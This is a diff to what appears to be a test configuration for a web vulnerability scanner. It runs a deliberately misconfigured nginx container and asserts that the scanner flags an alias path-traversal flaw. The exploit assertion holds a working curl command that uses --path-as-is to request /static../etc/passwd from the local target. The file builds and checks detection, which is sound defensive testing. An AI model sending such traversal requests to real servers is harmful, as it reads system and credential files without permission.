@@ -8,8 +8,7 @@ services:
     ports: ["9209:80"]
     volumes:
       - ./nginx-alias/nginx.conf:/etc/nginx/conf.d/default.conf:ro
-      - ./nginx-alias/html:/var/www/html:ro
-      - ./nginx-alias/secret:/var/secret:ro
+      - ./nginx-alias/html:/app:ro
 
 ready:
   cmd: "curl -sf http://localhost:9209/ >/dev/null"
@@ -17,16 +16,16 @@ ready:
   interval: 2s
 
 assertions:
-  - name: exploit-alias-traversal-reads-secret
+  - name: exploit-alias-traversal-reads-passwd
     type: command
     expect:
-      command: "curl -sf http://localhost:9209/static../secret/passwords.txt | grep -q hunter2"
+      command: "curl -sf --path-as-is http://localhost:9209/static../etc/passwd | grep -q root"
       exit_code: 0
 
   - name: detects-nginx-alias-traversal
     type: beacon
     target: localhost:9209
-    args: ["--no-enrich", "--scanners", "nginx", "--deep", "--permission-confirmed", "--ports", "80"]
+    args: ["--no-enrich", "--scanners", "nginx", "--deep", "--permission-confirmed"]
     expect:
       check_id: web.nginx_alias_traversal
 
